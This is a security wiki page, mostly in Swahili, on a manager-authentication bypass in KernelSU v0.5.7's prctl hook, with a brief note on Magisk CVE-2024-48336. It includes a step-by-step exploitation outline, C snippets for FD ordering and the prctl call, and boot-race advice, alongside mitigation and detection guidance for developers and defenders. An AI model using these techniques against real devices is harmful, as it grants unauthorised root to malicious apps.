# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks kama KernelSU, APatch na SKRoot hupatch au ku-hook Android/Linux kernel na kufichua utendakazi wenye privileged kwa app ya manager ya userspace isiyo na privileged. Magisk inajadiliwa kando hapa chini kwa sababu CVE-2024-48336 ilihusisha code loading upande wa manager badala ya njia hii ya KernelSU syscall.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ukurasa huu unatoa muhtasari wa techniques na pitfalls zilizogunduliwa katika utafiti wa umma (hasa uchanganuzi wa Zimperium wa KernelSU v0.5.7) ili kusaidia timu za red na blue kuelewa attack surfaces, exploitation primitives na mitigations thabiti.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Katika KernelSU v0.5.7, kernel hook kwenye `prctl` hupokea magic value, command ID na arguments mahususi za command kutoka userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller huomba kwanza hali ya manager kwa `CMD_BECOME_MANAGER`. Authorization ni mahususi kwa command: `CMD_GRANT_ROOT` hukagua hali ya manager/allowlist, `CMD_ALLOW_SU` ni ya manager pekee, na `CMD_SET_SEPOLICY` ni ya root pekee katika toleo hili.<sup>[[2]](#references)[[11]](#references)</sup>
- Commands nyingine huuliza version/configuration au kuripoti matukio ya framework.<sup>[[2]](#references)</sup>
- Kwa kuwa app yoyote inaweza kuita syscall interface hii, usahihi wa manager authentication ni muhimu sana.<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value ya kuelekeza kwenye KernelSU handler: 0xDEADBEEF
- Commands zinajumuisha: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, n.k.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (kama ilivyotekelezwa)

Userspace inapoiita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU huthibitisha:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Path iliyotolewa lazima ianze na prefix inayotarajiwa kwa caller UID, kwa mfano /data/data/<pkg> au /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path lazima iwe inamilikiwa na caller UID.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check kupitia FD table scan
- Iterate kwenye file descriptors zilizofunguliwa za calling process kwa mpangilio unaoongezeka wa descriptor.
- Kwa kila regular file ambayo path yake inaanza na `/data/app/` na kuishia na `/base.apk`, hitaji path iwe na package substring iliyotokana na supplied data-directory path.
- Verify signature ya candidate wa kwanza anayepita path checks hizo.
- Parse APK v2 signature na uithibitishe dhidi ya official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Checks zote zikifaulu, kernel huhifadhi UID ya manager kwa muda; commands za manager pekee hukubali UID hiyo, huku commands nyingine zikiendelea kutumia UID zao au allowlist checks zao.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 haihusishi signature result na package identity iliyosakinishwa na PackageManager. Katika `manager.c`, package test ni path substring check pekee (`strstr(cwd, pkg)`); candidate wa kwanza anayepita test hiyo hukaguliwa signature. Kwa hivyo attacker anaweza kuweka genuine manager APK chini ya path ya `/data/app/` ambayo pia ina package name ya attacker na kupanga ichaguliwe kwanza.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Trust-by-indirection hii huruhusu app isiyo na privileged kujiwakilisha kama manager bila kumiliki signing key ya manager.<sup>[[1]](#references)</sup>

Key properties zilizotumiwa:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan hupangwa kwa descriptor index na package check ni path substring test, si verified package-to-APK identity binding.
- open() hurudisha FD nambari ya chini zaidi inayopatikana. Kwa kufunga FDs zenye nambari ndogo kwanza, attacker anaweza kudhibiti mpangilio.
- Bundled manager APK inaweza kuwekwa chini ya `/data/app/` kwenye path iliyo na package string ya attacker huku ikihifadhi official manager signature.

---
## Attack preconditions

Kesi halisi ya KernelSU v0.5.7 inahitaji:<sup>[[1]](#references)[[3]](#references)</sup>

- Device iwe tayari ime-rootiwa kwa rooting framework yenye vulnerability (kwa mfano, KernelSU v0.5.7).
- Attacker aweze kuendesha arbitrary unprivileged code locally (Android app process).
- Kwa implementation ya v0.5.7, `current->real_parent` lazima iwe na UID 0 (source comment inaeleza hili kama zygote direct-child requirement); `manager.c` hukataa parents wengine.<sup>[[3]](#references)</sup>
- Manager halisi awe bado hajafanya authentication (kwa mfano, mara tu baada ya reboot). Baadhi ya frameworks huhifadhi manager UID baada ya success; lazima ushinde race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (video ya demo ya d inaonyesha public proof of concept ikifanya kazi):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Tengeneza path halali ya app data directory yako ili kutimiza prefix na ownership checks.
2) Weka genuine KernelSU Manager base.apk chini ya `/data/app/` kwenye path iliyo na package string yako, kisha ifungue kwenye FD yenye nambari ndogo kuliko FD ya base.apk yako.
3) Ita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) ili upite checks.
4) Tumia `CMD_GRANT_ROOT`, kisha `CMD_ALLOW_SU` kwa su ya kudumu; ita root-only `CMD_SET_SEPOLICY` baada tu ya kupata root na pale inapoungwa mkono.

Practical notes kuhusu step 2 (FD ordering):<sup>[[1]](#references)</sup>
- Tambua FD ya process yako kwa `/data/app/*/base.apk` yako mwenyewe kwa kutembea kwenye `/proc/self/fd` symlinks.
- Funga FD ya chini (kwa mfano, stdin, fd 0) na ufungue legitimate manager APK kwanza ili ichukue fd 0 (au index yoyote iliyo chini ya FD ya base.apk yako).
- Bundle legitimate manager APK pamoja na app yako ili path yake ianze na `/data/app/`, iishie na `/base.apk`, na iwe na package string yako. Kwa mfano, path iliyo chini ya `lib` directory ya app yako inaweza kutimiza checks hizi.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, kwa madhumuni ya kuonyesha tu):

Enumerate open FDs ili kupata entries za base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Lazimisha FD yenye nambari ndogo kuelekeza kwenye APK halali ya manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uthibitishaji wa Manager kupitia `prctl` hook ya KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Baada ya kufanikiwa, privileged commands (mifano):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promote current process to root
- CMD_ALLOW_SU: ongeza package/UID yako kwenye allowlist kwa persistent su
- CMD_SET_SEPOLICY: rekebisha SELinux policy baada ya kupata root; KernelSU v0.5.7 hukagua UID 0 kwa command hii.<sup>[[2]](#references)</sup>

Ushauri wa race/persistence:
- Sajili receiver ya BOOT_COMPLETED kwenye AndroidManifest (`RECEIVE_BOOT_COMPLETED`) ili kuanza baada ya reboot na kujaribu authentication kabla ya manager halisi; permission hii inaruhusu kupokea `ACTION_BOOT_COMPLETED` lakini haihakikishi yenyewe scheduling priority.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Mwongozo wa detection na mitigation

Kwa developers wa framework:
- Funga authentication kwenye package/UID ya caller, si kwenye FDs zisizo maalum:
- Tambua package ya caller kutoka kwa UID yake na uithibitishe dhidi ya signature ya package iliyosakinishwa (kupitia PackageManager) badala ya kuchanganua FDs.
- Ikiwa ni kernel-only, tumia caller identity thabiti (task creds) na uithibitishe dhidi ya source of truth thabiti inayodhibitiwa na init/userspace helper, si process FDs.
- Epuka ukaguzi wa path-prefix kama identity; caller anaweza kuutimiza kwa urahisi.
- Tumia challenge–response yenye msingi wa nonce kupitia channel na ufute manager identity yoyote iliyohifadhiwa wakati wa boot au kwenye key events.
- Fikiria kutumia authenticated IPC yenye msingi wa binder badala ya kupakia generic syscalls kupita kiasi inapowezekana.

Kwa defenders/blue team:
- Tambua kuwepo kwa rooting frameworks na manager processes; fuatilia prctl calls zenye magic constants zinazotia shaka (kwa mfano, 0xDEADBEEF) ikiwa una kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- Kwenye managed fleets, zuia au toa alert kuhusu boot receivers kutoka packages zisizoaminika zinazojaribu kwa haraka privileged manager commands baada ya boot.
- Hakikisha devices zimesasishwa hadi patched framework versions; invalidate cached manager IDs wakati wa update.

Limitations za attack:<sup>[[1]](#references)[[2]](#references)</sup>
- Huathiri tu devices ambazo tayari zime-rootiwa kwa vulnerable framework.
- Kwa kawaida huhitaji reboot/race window kabla ya manager halali kufanya authentication (baadhi ya frameworks huhifadhi manager UID hadi reset).

---
## Maelezo yanayohusiana katika frameworks mbalimbali

- Password-based auth (kwa mfano, historical APatch/SKRoot builds) inaweza kuwa dhaifu ikiwa passwords zinaweza kukisiwa/bruteforce au validations zina bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (kwa mfano, KernelSU) ni imara zaidi kimsingi, lakini lazima ifungwe kwenye caller halisi, si artefacts zinazotokana na path na kuchaguliwa kupitia FD scans.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 iliathiri builds za kabla ya Canary 27007 ambazo zilipakia code kutoka kwenye GMS package isiyothibitishwa, na kuruhusu local app kutekeleza code ndani ya Magisk app na ku-escalate hadi root bila user interaction.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rooting ya Uovu Wote: Mashimo ya Usalama Yanayoweza Kuhatarisha Kifaa Chako cha Mkononi](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – ukaguzi wa authentication wa core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteration ya FD, ukaguzi wa package na signature call katika manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – uthibitishaji wa APK v2 katika apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Mradi wa KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Suala la Magisk #8279 – Thibitisha kuwa GMS ni system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Video ya demo ya KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – command identifiers za ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
